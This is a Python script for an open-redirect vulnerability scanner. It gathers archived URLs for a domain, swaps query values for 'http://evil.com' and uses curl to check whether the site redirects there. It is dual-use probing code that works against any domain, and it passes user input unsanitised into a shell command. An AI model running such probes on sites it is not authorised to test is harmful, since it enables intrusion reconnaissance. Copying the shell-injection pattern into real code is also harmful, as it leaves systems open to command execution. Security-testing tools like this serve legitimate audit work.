import os
import subprocess

# Couleurs pour le terminal
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
RESET = "\033[0m"

# Bannière ASCII
def banner():
    print(f"""{CYAN}
          
 .d88888b.      8888888b.     888     888    .d8888b.  
d88P" "Y88b     888   Y88b    888     888   d88P  Y88b 
888     888     888    888    888     888   Y88b.      
888     888     888   d88P    Y88b   d88P    "Y888b.   
888     888     8888888P"      Y88b d88P        "Y88b. 
888     888     888 T88b        Y88o88P           "888 
Y88b. .d88P d8b 888  T88b  d8b   Y888P  d8b Y88b  d88P 
 "Y88888P"  Y8P 888   T88b Y8P    Y8P   Y8P  "Y8888P"  
                                                    
    Open Redirect Vulnerability Scanner
    {RESET}@yaryatchi - github.com/yaryatchii
    """)

def scan_domain(domain):
    print(f"{YELLOW}Scanning {domain} for open redirect vulnerabilities...{RESET}")
    try:
        # Exécuter la commande pour chercher les redirections ouvertes
        result = subprocess.getoutput(
            f"waybackurls {domain} | grep -a -i =http | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I | grep 'evil.com' && echo \"$host {RED}is Vulnerable{RESET}\"; done"
        )
        if result:
            print(result)
        else:
            print(f"{RED}No open redirect vulnerabilities found on {domain}.{RESET}")
    except Exception as e:
        print(f"{RED}An error occurred: {e}{RESET}")

def scan_from_file(file_path):
    if not os.path.isfile(file_path):
        print(f"{RED}The specified file does not exist.{RESET}")
        return
    with open(file_path, 'r') as file:
        domains = file.readlines()
    for domain in domains:
        domain = domain.strip()
        if domain:
            scan_domain(domain)

def main():
    banner()
    print(f"{CYAN}1. Scan a single domain{RESET}")
    print(f"{CYAN}2. Scan from a list of domains (.txt){RESET}")
    choice = input(f"{YELLOW}Enter your choice (1 or 2): {RESET}")

    if choice == '1':
        domain = input(f"{YELLOW}Enter the domain to scan: {RESET}")
        scan_domain(domain)
    elif choice == '2':
        file_path = input(f"{YELLOW}Enter the path to the .txt file containing the list of domains: {RESET}")
        scan_from_file(file_path)
    else:
        print(f"{RED}Invalid choice. Please enter 1 or 2.{RESET}")

if __name__ == "__main__":
    main()
